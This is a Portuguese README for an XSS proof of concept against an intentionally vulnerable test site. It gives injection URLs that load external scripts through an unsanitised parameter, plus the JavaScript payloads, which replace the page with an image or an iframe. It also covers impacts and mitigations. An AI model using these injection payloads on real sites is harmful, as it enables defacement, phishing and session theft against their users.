# XSS PoC - Prova de Conceito

## ⚠️ **Aviso Legal**
🚨 **Este projeto é destinado a pesquisas de segurança ética e testes autorizados.**  
⚠️ **Não utilize em sistemas sem permissão explícita!** 
#
## Descrição do Projeto

Este projeto demonstra uma vulnerabilidade de **Cross-Site Scripting (XSS)**. A PoC explora a execução de código JavaScript injetado através de parâmetros não sanitizados em uma aplicação vulnerável. O ataque pode ser usado para alterar o conteúdo da página, exibir mensagens enganosas, carregar iframes maliciosos ou roubar dados do usuário.

## Estrutura do Projeto

- **`index.html`** → Página HTML básica usada como alvo do ataque.
- **`app.js`** → Script que substitui o conteúdo da página por uma imagem.
- **`app2.js`** → Script que insere um iframe carregando uma página externa.
- **`esmola.png`** → Imagem usada na PoC.

## Prova de Conceito (PoC)

Para demonstrar a vulnerabilidade, pode-se injetar um script externo via URL maliciosa como esta, inserindo uam imagem:

```
http://php.testinvicti.com/artist.php?id=<script+src=https://jeanrafaellourenco.github.io/xss-poc/app.js></script>
```

Ou, para carregar uma página externa dentro de um iframe:

```
http://php.testinvicti.com/artist.php?id=<script+src=https://jeanrafaellourenco.github.io/xss-poc/app2.js></script>
```

### Código JavaScript Injetado

**`app.js` - Exibição de Imagem:**
```javascript
document.querySelector('html').innerHTML='<img src="https://jeanrafaellourenco.github.io/xss-poc/esmola.png"/>';
```

**`app2.js` - Inserção de iframe:**
```javascript
document.querySelector('html').innerHTML='<iframe src="https://jeanrafaellourenco.github.io/xss-poc/" width="480" height="270" frameBorder="0"></iframe>';
```

## Impacto da Falha

- **Defacement:** O site pode ser visualmente alterado sem permissão.
- **Phishing:** Usuários podem ser enganados para inserir credenciais em uma página falsa.
- **Roubo de Sessão:** Um atacante pode capturar cookies e tokens de autenticação.
- **Execução de Scripts Maliciosos:** Qualquer código pode ser executado no contexto do site vulnerável.

## Mitigação

1. **Sanitização de entrada:** Filtrar e escapar entradas do usuário para evitar a injeção de scripts.
2. **Implementação de CSP (Content Security Policy):** Restringir fontes externas de scripts.
3. **Uso de Cookies com HTTPOnly:** Impedir o acesso aos cookies via JavaScript.
4. **Validação do lado do servidor:** Evitar a inserção direta de dados do usuário no HTML.

## Conclusão

Este projeto demonstra como um XSS pode ser explorado para comprometer a segurança de um site. A mitigação dessa vulnerabilidade é essencial para proteger os usuários e a integridade da aplicação.
